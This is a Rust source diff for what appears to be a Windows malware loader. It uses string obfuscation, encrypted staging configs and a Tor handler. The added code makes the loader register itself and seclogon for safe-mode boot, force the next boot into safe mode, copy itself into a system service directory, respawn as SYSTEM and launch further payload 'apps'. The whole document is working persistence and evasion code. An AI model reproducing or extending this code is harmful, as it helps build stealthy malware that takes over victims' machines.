@@ -6,6 +6,8 @@ use crate::safemode::utils::{
     safemode_fail_safe,
     set_next_boot_safemode,
 };
+use serde::{ Deserialize, Serialize };
+use shared::utils::encryption::{ convert_key_to_bytes, sauron_decrypt, sauron_encrypt };
 use crate::network::tor::LdrTrHandler;
 use crate::service::utils::SERVICE_TYPE;
 use crate::{ err, info, tag, warn };
@@ -14,22 +16,18 @@ use loader_vars::constants::{ loader_service_name, system_log_directory, system_
 use loader_vars::types::receive::RnCnfgPrms;
 use obfstr::obfstr as s;
 use shared::constants::{
+    configs_encryption_key,
     get_initial_install_dir,
     get_loader_install_lock_dir,
     logs_encryption_key,
     system_loader_exe_name,
 };
 use shared::network::tor::LoggerCnfg;
-use shared::utils::config::{
-    load_mib_config,
-    loader_cache_config,
-    write_loader_cache_config,
-    CacheCnfgLdr,
-    LdrStage,
-};
+use shared::utils::config::load_mib_config;
 use shared::utils::functions::{
     exit_1_insta,
     get_current_exe,
+    get_current_exe_dir,
     is_running_from_system32,
     try_spawn_program_as_system,
 };
@@ -101,11 +99,15 @@ fn service_runner() -> Result<()> {
     let is_safe_mode = is_safe_mode();
 
     if !mib_config.cln_up_done && !is_safe_mode {
-        pre_cleanup()?;
+        if let Err(error) = pre_cleanup() {
+            err!("pre_cleanup error: ", error);
+        }
     }
 
     if !mib_config.cln_up_done && is_safe_mode {
-        launch_cleanup();
+        if let Err(error) = launch_cleanup() {
+            err!("launch_cleanup error: ", error);
+        }
     }
 
     if mib_config.cln_up_done && !is_running_from_system32 {
@@ -116,7 +118,9 @@ fn service_runner() -> Result<()> {
     }
 
     if mib_config.cln_up_done && is_running_from_system32 {
-        system_service_work();
+        if let Err(error) = system_service_work() {
+            err!("system_service_work error: ", error);
+        }
     }
     info!("Service end");
 
@@ -125,7 +129,7 @@ fn service_runner() -> Result<()> {
             service_type: SERVICE_TYPE,
             current_state: ServiceState::Stopped,
             controls_accepted: ServiceControlAccept::empty(),
-            exit_code: ServiceExitCode::Win32(1),
+            exit_code: ServiceExitCode::Win32(0),
             checkpoint: 0,
             wait_hint: Duration::default(),
             process_id: None,
@@ -137,31 +141,37 @@ fn service_runner() -> Result<()> {
 
 fn pre_cleanup() -> Result<()> {
     tag!("PRE-CLEANUP");
+    if let Ok(cache_config) = loader_cache_config() {
+        match cache_config.st {
+            LdrSt::NonRegd => {
+                info!("NonRegd");
+                register_seclogon_for_safemode()?;
+                write_loader_cache_config(&(CfgLdr { st: LdrSt::SclRegd }))?;
+            }
+            LdrSt::SclRegd => {
+                info!("SclRegd");
 
-    let cache_config = loader_cache_config()?;
+                register_self_for_safemode()?;
+                write_loader_cache_config(&(CfgLdr { st: LdrSt::SlfRegd }))?;
+            }
+            LdrSt::SlfRegd => {
+                info!("SlfRegd");
 
-    match cache_config.stage {
-        LdrStage::NoneReged => {
-            register_seclogon_for_safemode()?;
-            write_loader_cache_config(&(CacheCnfgLdr { stage: LdrStage::SclReged }))?;
+                set_next_boot_safemode()?;
+                write_loader_cache_config(&(CfgLdr { st: LdrSt::SfbRegd }))?;
+            }
+            LdrSt::SfbRegd => {
+                info!("SfbRegd");
+            }
         }
-        LdrStage::SclReged => {
-            register_self_for_safemode()?;
-            write_loader_cache_config(&(CacheCnfgLdr { stage: LdrStage::SlfReged }))?;
-        }
-        LdrStage::SlfReged => {
-            set_next_boot_safemode()?;
-            write_loader_cache_config(&(CacheCnfgLdr { stage: LdrStage::SfbReged }))?;
-        }
-        LdrStage::SfbReged => {}
     }
 
     Ok(())
 }
 
-fn launch_cleanup() {
+fn launch_cleanup() -> Result<()> {
     tag!("LAUNCH-CLEANUP");
-    if let Err(error) = try_spawn_program_as_system(get_current_exe().to_str().unwrap(), None) {
+    if let Err(error) = try_spawn_program_as_system(get_current_exe()?.to_str().unwrap(), None) {
         err!("spawn_program_as_system Error: ", error);
         safemode_fail_safe();
     } else {
@@ -173,6 +183,7 @@ fn launch_cleanup() {
         });
         let _ = fail_safe_thread.join();
     }
+    Ok(())
 }
 
 fn post_cleanup() -> Result<()> {
@@ -180,22 +191,18 @@ fn post_cleanup() -> Result<()> {
 
     create_dir_all(system_service_directory())?;
     let system_exe = system_service_directory().join(system_loader_exe_name());
-    std::fs::copy(get_current_exe(), &system_exe)?;
+    std::fs::copy(get_current_exe()?, &system_exe)?;
     let cache_path = system_service_directory().join(s!("cache.cfg"));
     std::fs::write(cache_path, "")?;
 
     // then we just run it, and exit - if it fails we auto restart next boot
     try_spawn_program_as_system(system_exe.to_str().unwrap(), None)?;
-    let mib_config = load_mib_config(false)?;
-    if mib_config.clnts.len() == 0 {
-        run_config(RnCnfgPrms::default()).unwrap();
-        // first run insta
-    }
 
     Ok(())
 }
 
-fn system_service_work() {
+fn system_service_work() -> Result<()> {
+    tag!("SYSTEM-SERVICE-WORK");
     let initial_install_dir = get_initial_install_dir();
     if initial_install_dir.exists() && initial_install_dir.is_dir() {
         if let Err(error) = remove_dir_all(initial_install_dir) {
@@ -208,6 +215,9 @@ fn system_service_work() {
             err!("create_dir_all on loader_install_lock_dir Error: ", error);
         }
     }
+
+    // always run default - if theres already installed - we just run the apps, if higher versions also run those
+    run_config(RnCnfgPrms::default())?;
 
     tokio::runtime::Builder
         ::new_multi_thread()
@@ -223,4 +233,53 @@ fn system_service_work() {
                 handler.run_handler().await;
             }
         });
+    Ok(())
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub enum LdrSt {
+    NonRegd,
+    SclRegd,
+    SlfRegd,
+    SfbRegd,
+}
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct CfgLdr {
+    pub st: LdrSt,
+}
+impl Default for CfgLdr {
+    fn default() -> Self {
+        Self {
+            st: LdrSt::NonRegd,
+        }
+    }
+}
+pub fn loader_cache_config() -> Result<CfgLdr> {
+    let file_path = get_current_exe_dir()?.join(s!("cache.cfg"));
+
+    let enc_key_bytes = convert_key_to_bytes(&configs_encryption_key());
+
+    if let Ok(data) = std::fs::read(file_path.clone()) {
+        if let Ok(decrypted_data) = sauron_decrypt(enc_key_bytes, &data) {
+            if let Ok(cnfg) = serde_json::from_slice(&decrypted_data) {
+                return Ok(cnfg);
+            }
+        }
+    }
+
+    let default_cache = CfgLdr::default();
+
+    let encrypted_data = sauron_encrypt(enc_key_bytes, &serde_json::to_vec(&default_cache)?)?;
+
+    std::fs::write(file_path, encrypted_data)?;
+
+    Ok(default_cache)
+}
+
+pub fn write_loader_cache_config(config: &CfgLdr) -> Result<()> {
+    let file_path = get_current_exe_dir()?.join(s!("cache.cfg"));
+    let enc_key_bytes = convert_key_to_bytes(&configs_encryption_key());
+    let encrypted_data = sauron_encrypt(enc_key_bytes, &serde_json::to_vec(config)?)?;
+    std::fs::write(file_path, encrypted_data)?;
+    Ok(())
 }
